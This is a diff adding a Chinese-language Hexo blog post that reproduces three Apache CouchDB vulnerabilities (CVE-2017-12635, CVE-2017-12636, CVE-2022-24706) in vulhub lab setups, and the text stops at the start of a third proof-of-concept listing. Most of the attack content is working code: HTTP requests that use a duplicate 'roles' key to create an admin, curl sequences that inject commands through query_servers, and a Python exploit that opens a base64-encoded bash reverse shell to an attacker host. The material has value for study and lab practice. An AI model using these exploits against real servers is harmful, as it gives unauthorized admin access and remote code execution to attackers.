@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>couchdb | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）简介介绍​    Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="couchdb">
+<meta property="og:url" content="http://example.com/2023/11/30/couchdb/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）简介介绍​    Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201113453797.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201113534397.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201151842582.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201152033957.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201152120889.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201153045264.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201153120275.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201153152339.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201153756467.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201153741072.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201154552500.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201154640816.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201154737799.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201154829888.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201154911032.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201155715101.png">
+<meta property="og:image" content="http://example.com/2023/11/30/couchdb/image-20231201160709656.png">
+<meta property="article:published_time" content="2023-11-30T10:08:32.000Z">
+<meta property="article:modified_time" content="2023-12-01T08:07:40.569Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="couchdb">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/30/couchdb/image-20231201113453797.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">John Doe</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/ActiveMQ/" style="font-size: 10px;">ActiveMQ</a> <a href="/tags/ActiveMQ-CVE-2015-5254/" style="font-size: 10px;">ActiveMQ CVE-2015-5254</a> <a href="/tags/CVE-2021-21311-CVE-2021-43008/" style="font-size: 10px;">CVE-2021-21311 CVE-2021-43008</a> <a href="/tags/CVE-2021-25646/" style="font-size: 10px;">CVE-2021-25646</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/airflow/" style="font-size: 10px;">airflow</a> <a href="/tags/apisix/" style="font-size: 10px;">apisix</a> <a href="/tags/appweb-aria2/" style="font-size: 10px;">appweb aria2</a> <a href="/tags/couchdb/" style="font-size: 10px;">couchdb</a> <a href="/tags/csrf-ssrf/" style="font-size: 10px;">csrf ssrf</a> <a href="/tags/dns-dubbo/" style="font-size: 10px;">dns dubbo</a> <a href="/tags/php/" style="font-size: 20px;">php</a> <a href="/tags/php-mysql/" style="font-size: 15px;">php;mysql</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82-POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6-WAF-SQLMAP/" style="font-size: 10px;">堆叠注入,宽字节,POST注入,HTTP头注入,二次注入,写入文件,WAF,SQLMAP</a> <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" style="font-size: 20px;">春秋云镜</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-couchdb" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/11/30/couchdb/" class="article-date">
+  	<time datetime="2023-11-30T10:08:32.000Z" itemprop="datePublished">2023-11-30</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      couchdb
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/couchdb/" rel="tag">couchdb</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>​    Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>​    小于 1.7.0 以及 小于 2.1.1</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​    在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>编译及启动环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker compose build</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231201113453797.png" alt="image-20231201113453797"></p>
+<p>环境启动后，访问<code>http://your-ip:5984/_utils/</code>即可看到一个web页面，说明Couchdb已成功启动。但我们不知道密码，无法登陆。</p>
+<p><img src="image-20231201113534397.png" alt="image-20231201113534397"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先，抓包发送如下数据包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1</span><br><span class="line">Host: ip:5984</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 90</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见，返回403错误：<code>&#123;&quot;error&quot;:&quot;forbidden&quot;,&quot;reason&quot;:&quot;Only _admin may set roles&quot;&#125;</code>，只有管理员才能设置Role角色：</p>
+<p><img src="image-20231201151842582.png" alt="image-20231201151842582"></p>
+<p>发送包含两个roles的数据包，即可绕过限制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:5984</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功创建管理员，账户密码均为<code>vulhub</code>：</p>
+<p><img src="image-20231201152033957.png" alt="image-20231201152033957"></p>
+<p>再次访问<code>http://your-ip:5984/_utils/</code>，输入账户密码<code>vulhub</code>，可以成功登录：</p>
+<p><img src="image-20231201152120889.png" alt="image-20231201152120889"></p>
+<h1 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb 任意命令执行漏洞（CVE-2017-12636）</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>​    Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p>
+<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>​    小于 1.7.0 以及 小于 2.1.1</p>
+<h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​    在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。</p>
+<h2 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>Couchdb 2.x和和1.x的API接口有一定区别，所以这个漏洞的利用方式也不同。本环境启动的是1.6.0版本，如果你想测试2.1.0版本，可以启动<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>附带的环境。</p>
+<p>执行如下命令启动Couchdb 1.6.0环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231201153045264.png" alt="image-20231201153045264"></p>
+<p>启动完成后，访问<code>http://your-ip:5984/</code>即可看到Couchdb的欢迎页面。</p>
+<p><img src="image-20231201153120275.png" alt="image-20231201153120275"></p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先增加一个管理员用户。</p>
+<p>增加用户，使用burp或者curl命令发送如下请求包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:5984</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建用户名为：vulhub；密码为：vulhub的用户</p>
+<p><img src="image-20231201153152339.png" alt="image-20231201153152339"></p>
+<h3 id="1-6-0-下的说明"><a href="#1-6-0-下的说明" class="headerlink" title="1.6.0 下的说明"></a>1.6.0 下的说明</h3><p>依次执行如下请求即可触发任意命令执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.86.162:5984&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39; -d &#39;&quot;id &gt;&#x2F;tmp&#x2F;success&quot;&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.86.162:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.86.162:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br><span class="line">curl -X POST &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.86.162:5984&#x2F;vultest&#x2F;_temp_view?limit&#x3D;10&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type:application&#x2F;json&#39;</span><br></pre></td></tr></table></figure>
+
+<p>其中,<code>vulhub:vulhub</code>为管理员账号密码。</p>
+<p>第一个请求是添加一个名字为<code>cmd</code>的<code>query_servers</code>，其值为<code>&quot;id &gt;/tmp/success&quot;</code>，这就是我们后面待执行的命令。</p>
+<p>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。</p>
+<p>第四个请求就是在这个Database里进行查询，因为我将language设置为<code>cmd</code>，这里就会用到我第一步里添加的名为<code>cmd</code>的<code>query_servers</code>，最后触发命令执行。</p>
+<p><img src="image-20231201153756467.png" alt="image-20231201153756467"></p>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;ip:5984&#39;</span><br><span class="line">command &#x3D; rb&quot;&quot;&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;端口 0&gt;&amp;1&quot;&quot;&quot;</span><br><span class="line">version &#x3D; 1</span><br><span class="line"></span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">session.headers &#x3D; &#123;</span><br><span class="line">    &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;</span><br><span class="line">&#125;</span><br><span class="line"> #session.proxies &#x3D; &#123;</span><br><span class="line"> #      &#39;http&#39;: &#39;http:&#x2F;&#x2F;127.0.0.1:8085&#39;</span><br><span class="line"> # &#125;</span><br><span class="line"> </span><br><span class="line">session.put(target + &#39;&#x2F;_users&#x2F;org.couchdb.user:wooyun&#39;, data&#x3D;&#39;&#39;&#39;&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;wooyun&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;wooyun&quot;</span><br><span class="line">&#125;&#39;&#39;&#39;)</span><br><span class="line"></span><br><span class="line">session.auth &#x3D; HTTPBasicAuth(&#39;wooyun&#39;, &#39;wooyun&#39;)</span><br><span class="line"></span><br><span class="line">command &#x3D; &quot;bash -c &#39;&#123;echo,%s&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;&quot; % base64.b64encode(command).decode()</span><br><span class="line">if version &#x3D;&#x3D; 1:</span><br><span class="line">    session.put(target + (&#39;&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39;), data&#x3D;json.dumps(command))</span><br><span class="line">else:</span><br><span class="line">    host &#x3D; session.get(target + &#39;&#x2F;_membership&#39;).json()[&#39;all_nodes&#39;][0]</span><br><span class="line">    session.put(target + &#39;&#x2F;_node&#x2F;&#123;&#125;&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39;.format(host), data&#x3D;json.dumps(command))</span><br><span class="line"></span><br><span class="line">session.put(target + &#39;&#x2F;wooyun&#39;)</span><br><span class="line">session.put(target + &#39;&#x2F;wooyun&#x2F;test&#39;, data&#x3D;&#39;&#123;&quot;_id&quot;: &quot;wooyuntest&quot;&#125;&#39;)</span><br><span class="line"></span><br><span class="line">if version &#x3D;&#x3D; 1:</span><br><span class="line">    session.post(target + &#39;&#x2F;wooyun&#x2F;_temp_view?limit&#x3D;10&#39;, data&#x3D;&#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39;)</span><br><span class="line">else:</span><br><span class="line">    session.put(target + &#39;&#x2F;wooyun&#x2F;_design&#x2F;test&#39;, data&#x3D;&#39;&#123;&quot;_id&quot;:&quot;_design&#x2F;test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231201153741072.png" alt="image-20231201153741072"></p>
+<h3 id="2-1-0-下的说明"><a href="#2-1-0-下的说明" class="headerlink" title="2.1.0 下的说明"></a>2.1.0 下的说明</h3><p>2.1.0中修改了我上面用到的两个API，这里需要详细说明一下。</p>
+<p>Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问<code>/_membership</code>即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;_membership</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231201154552500.png" alt="image-20231201154552500"></p>
+<p>可见，我们这里只有一个node，名字是<code>nonode@nohost</code>。</p>
+<p>然后，我们修改<code>nonode@nohost</code>的配置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;_node&#x2F;nonode@nohost&#x2F;_config&#x2F;query_servers&#x2F;cmd -d &#39;&quot;id &gt;&#x2F;tmp&#x2F;success&quot;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231201154640816.png" alt="image-20231201154640816"></p>
+<p>然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231201154737799.png" alt="image-20231201154737799"></p>
+<p>Couchdb 2.x删除了<code>_temp_view</code>，所以我们为了触发<code>query_servers</code>中定义的命令，需要添加一个<code>_view</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;_design&#x2F;vul -d &#39;&#123;&quot;_id&quot;:&quot;_design&#x2F;test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#39; -H &quot;Content-Type: application&#x2F;json&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231201154829888.png" alt="image-20231201154829888"></p>
+<p>增加<code>_view</code>的同时即触发了<code>query_servers</code>中的命令。</p>
+<p>再利用上面的exp进行反弹shell</p>
+<p><img src="image-20231201154911032.png" alt="image-20231201154911032"></p>
+<h1 id="CouchDB-Erlang-分布式协议代码执行-CVE-2022-24706"><a href="#CouchDB-Erlang-分布式协议代码执行-CVE-2022-24706" class="headerlink" title="CouchDB Erlang 分布式协议代码执行 (CVE-2022-24706)"></a>CouchDB Erlang 分布式协议代码执行 (CVE-2022-24706)</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>​    Apache CouchDB是一个Erlang开发的NoSQL数据库。</p>
+<h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><p>​    CouchDB 3.2.1及以前版本</p>
+<h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​    由于Erlang的特性，其支持分布式计算，分布式节点之间通过Erlang/OTP Distribution协议进行通信。攻击者如果知道通信时使用的Cookie，即可在握手包通过认证并执行任意命令。</p>
+<p>​    在CouchDB 3.2.1及以前版本中，使用了默认Cookie，值为“monster”。</p>
+<h2 id="漏洞环境-2"><a href="#漏洞环境-2" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个Apache CouchDB 3.2.1服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231201155715101.png" alt="image-20231201155715101"></p>
+<p>服务启动后，会监听三个端口：</p>
+<ul>
+<li>5984: Apache CouchDB Web管理接口</li>
+<li>4369: Erlang端口映射服务（epmd）</li>
+<li>9100: 集群节点通信和运行时自省服务（代码执行实际发生在这个端口中）</li>
+</ul>
+<p>其中，Web管理接口和epmd服务端口是固定的，而集群通信接口在Vulhub中是9100。实际环境下，这个端口通常是随机的，我们可以通过epmd服务来获取这个端口的数值。</p>
+<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>可以使用这个POC来利用本漏洞。这个POC会先通过目标的4369端口epmd服务获取集群通信的端口，也就是9100，然后再使用默认Cookie来控制节点执行任意命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py target-ip 4369</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231201160709656.png" alt="image-20231201160709656"></p>
+<p>POC:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 